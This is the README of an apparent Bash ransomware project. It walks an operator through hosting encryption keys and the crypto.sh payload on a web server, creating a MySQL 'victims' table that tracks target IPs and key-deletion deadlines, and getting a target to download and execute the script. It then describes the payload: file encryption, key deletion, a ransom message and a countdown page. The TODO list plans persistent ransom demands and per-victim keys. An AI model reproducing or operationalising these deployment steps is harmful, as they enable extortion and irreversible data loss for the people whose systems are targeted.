# Bash Ransomware

## Requirements
 - openssl
 - jquery
 - mysql
 - php 5 (php5-mysql)

## What to do on the server-side
 - $ openssl genrsa -out priv.pem 4096
 - $ openssl rsa -pubout -in priv.pem -out pub.pem
 - $ cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > key.bin
 - $ mkdir -p /var/www/html/downloads
 - > Modify crypto.sh to reflect your web server address or IP
 - $ cp crypto.sh /var/www/html/downloads/
 - $ cp pub.pem /var/www/html/downloads/
 - $ cp key.bin /var/www/html/downloads/
 - $ python SimplHTTPServer 8080 &
 - $ mv dec_auth.php /var/www/html/
 - $ mv target.php /var/www/html/
 - $ mv query.php /var/www/html/
 - > Modify decrypt.php, query.php, and target.php with your database information (Plan to create one file that can be referenced in each)
 - > Next, create the database for storing the data
 - $ mysql -u [user] -p
 - $ create database victims;
 - $ use victims;
 - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), curr_time timestamp not null, exp_time timestamp not null);
 - $ exit

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ chmod 755 crypto.sh
 - $ ./crypto.sh &

## What it does
 - Downloads the public key and key file to the target
 - Loops through the system and encrypts the various files
 - Deletes the key file and leaves the public key
 - Prints the ransom message
 - Links to web pages where the user can see an active countdown of the time that is left before key deletion

## TODO
 - Add in error handling for non-existing files
 - Imporve functionality and capabilities
 - Add persistent ransom demand
 - Unique key pair per victim (In work)
 - Add Screenshots
 - Make ransom message on web page prettier 
 - Create information text file or html file in each directory
